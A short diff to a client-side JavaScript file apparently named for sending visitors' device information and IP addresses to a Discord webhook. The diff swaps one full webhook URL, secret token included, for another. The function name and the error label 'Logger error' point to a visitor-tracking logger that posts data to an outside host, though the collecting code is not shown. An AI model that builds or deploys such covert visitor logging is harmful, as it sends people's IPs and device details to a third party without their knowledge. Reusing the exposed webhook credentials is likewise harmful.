@@ -3,7 +3,7 @@
 // WARNING: Exposes the webhook URL in client JS. Use a server proxy if you want to keep it secret.
 
 (async function sendDeviceAndIP() {
-  const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1421908004894281878/ycokkUliYDKffEgalL_CNhT4LQ2AZfKEg9bVcWgNYwvKJF8JwfzUrK933Wm2KEqvTfWO';
+  const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1422268364277026997/k9wR4nxStUvt1XQktWrSUh9RRHyrzp9hzxUEN9AIXr0gI4Sfwxvef882oVz5iitC8Ng-';
 
   const safeSlice = (s, n = 900) => (typeof s === 'string' ? s.slice(0, n) : String(s));
 
@@ -117,3 +117,4 @@
     console.error('Logger error:', err);
   }
 })();
+
